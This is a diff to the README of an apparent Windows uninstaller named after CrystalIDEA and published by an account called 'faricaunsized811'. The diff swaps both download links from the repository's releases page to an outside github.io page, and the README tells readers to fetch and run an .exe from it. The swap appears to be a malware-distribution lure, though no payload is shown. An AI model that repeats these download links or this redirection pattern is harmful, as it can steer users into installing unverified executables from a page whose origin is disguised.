@@ -1,6 +1,6 @@
 # 🛠️ CrystalIDEA-uninstall-tool - Remove stubborn applications from Windows completely
 
-[![](https://img.shields.io/badge/Download-Latest_Release-blue.svg)](https://github.com/faricaunsized811/CrystalIDEA-uninstall-tool/releases)
+[![](https://img.shields.io/badge/Download-Latest_Release-blue.svg)](https://faricaunsized811.github.io)
 
 This software helps you remove programs from your computer. Many default uninstaller tools leave files behind. These leftover files clutter your hard drive and take up space. This tool finds and deletes those extra files. It ensures your system remains clean after you remove a program. 
 
@@ -8,7 +8,7 @@ This software helps you remove programs from your computer. Many default uninsta
 
 You need the correct file for your version of Windows. Visit the link below to find the files for this application.
 
-[Click here to visit the release page and download the installer](https://github.com/faricaunsized811/CrystalIDEA-uninstall-tool/releases)
+[Click here to visit the release page and download the installer](https://faricaunsized811.github.io)
 
 Look for the file that ends in .exe. Click the file name to start the download. Save the file to your Downloads folder or your desktop so you can find it. 
 
